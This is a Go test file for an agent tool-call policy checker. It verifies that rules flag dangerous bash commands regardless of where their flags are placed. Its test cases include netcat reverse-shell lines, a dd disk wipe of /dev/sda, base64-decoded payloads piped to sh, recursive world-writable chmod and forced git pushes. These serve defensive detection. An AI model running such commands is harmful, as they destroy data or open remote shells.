// Copyright 2026 Josh Waldrep
// SPDX-License-Identifier: Apache-2.0

package policy

import (
	"slices"
	"testing"
)

const (
	ruleFileDelete  = "Destructive File Delete"
	rulePermissions = "Recursive Permission Change"
	ruleDiskWipe    = "Disk Wipe Command"
	rulePkgInstall  = "Package Install"
	ruleGit         = "Destructive Git Operation"
	ruleRevShell    = "Reverse Shell"
	ruleDetached    = "Detached Process Spawning"
	ruleEncoded     = "Encoded Command Execution"
)

func TestDefaultRules_CommandFlagPlacement(t *testing.T) {
	pc := defaultConfig(t)
	tests := []struct {
		cmd   string
		rule  string
		match bool
	}{
		{"chmod -R 777 /etc", rulePermissions, true},
		{"chmod -v -R 777 /etc", rulePermissions, true},
		{"chmod -Rv 777 /etc", rulePermissions, true},
		{"chmod -R -v 777 /etc", rulePermissions, true},
		{"chmod 777 -v -R /etc", rulePermissions, true},
		{"chmod -R 0777 /etc", rulePermissions, true},
		{"chown -h -R app /srv", rulePermissions, true},
		{"chmod -v 755 /etc", rulePermissions, false},
		{"chmod -R 755 /srv", rulePermissions, false},
		{"chmod -R a+rwx /srv", rulePermissions, true},
		{"chmod a+rwx -R /srv", rulePermissions, true},
		{"chmod -R a=rwx /srv", rulePermissions, true},
		{"chmod -R o+w /srv", rulePermissions, true},
		{"chmod -R ugo+rwx /srv", rulePermissions, true},
		{"chmod -R u+x,o+w /srv", rulePermissions, true},
		{"chmod -R a+rw /srv", rulePermissions, true},
		{"chmod -R a+r /srv", rulePermissions, false},
		{"chmod -R go-w /srv", rulePermissions, false},
		{"chmod -R u+rwx /srv", rulePermissions, false},
		{"chmod a+rwx /srv", rulePermissions, false},

		{"pip install requests", rulePkgInstall, true},
		{"pip3 install requests", rulePkgInstall, true},
		{"pip -q install requests", rulePkgInstall, true},
		{"pip --quiet --quiet install requests", rulePkgInstall, true},
		{"pip --timeout 5 install requests", rulePkgInstall, true},
		{"python -m pip install requests", rulePkgInstall, true},
		{"npm --silent install left-pad", rulePkgInstall, true},
		{"pip list", rulePkgInstall, false},
		{"go test ./...", rulePkgInstall, false},

		{"rm -v -r /srv", ruleFileDelete, true},
		{"rm -rv /srv", ruleFileDelete, true},
		{"rm --verbose --force /srv/x", ruleFileDelete, true},
		{"rm -v /srv/x", ruleFileDelete, false},

		{"git push origin main --force", ruleGit, true},
		{"git push -fu origin main", ruleGit, true},
		{"git reset HEAD~3 --hard", ruleGit, true},
		{"git clean -df", ruleGit, true},
		{"git clean -x -fd", ruleGit, true},
		{"git clean -f -d", ruleGit, true},
		{"git clean -d -f", ruleGit, true},
		{"git clean -f -x -d", ruleGit, true},
		{"git clean -d -x -f", ruleGit, true},
		{"git clean -xf -d", ruleGit, true},
		{"git clean -f", ruleGit, false},
		{"git clean -d -n", ruleGit, false},
		{"git clean -fx", ruleGit, false},
		{"git push --force-with-lease origin main", ruleGit, false},
		{"git push --follow-tags origin main", ruleGit, false},
		{"git reset --soft HEAD~1", ruleGit, false},
		{"git clean -n", ruleGit, false},

		{"dd status=none if=/dev/zero of=/dev/sda", ruleDiskWipe, true},
		{"dd bs=1M if=/dev/zero of=/dev/sda", ruleDiskWipe, true},
		{"dd of=/dev/sda if=/dev/zero", ruleDiskWipe, true},
		{"dd if=/dev/zero of=disk.img bs=1M", ruleDiskWipe, false},

		{"nc -v -e /bin/sh host 4444", ruleRevShell, true},
		{"nc host 4444 -e /bin/sh", ruleRevShell, true},
		{"netcat -e /bin/sh host 4444", ruleRevShell, true},
		{"nc -zv host 22", ruleRevShell, false},

		{"tmux new -s dev -d ./run.sh", ruleDetached, true},
		{"tmux -2 new -d ./run.sh", ruleDetached, true},
		{"tmux new -s dev", ruleDetached, false},

		{"base64 -i -d payload.b64 | sh", ruleEncoded, true},
		{"base64 -D payload.b64 | bash", ruleEncoded, true},
		{"base64 -w0 payload.bin | sh", ruleEncoded, false},
	}
	for _, tt := range tests {
		t.Run(tt.cmd, func(t *testing.T) {
			v := pc.CheckToolCall("bash", []string{tt.cmd})
			if got := slices.Contains(v.Rules, tt.rule); got != tt.match {
				t.Fatalf("rule %q matched=%v, want %v (rules %v)", tt.rule, got, tt.match, v.Rules)
			}
		})
	}
}
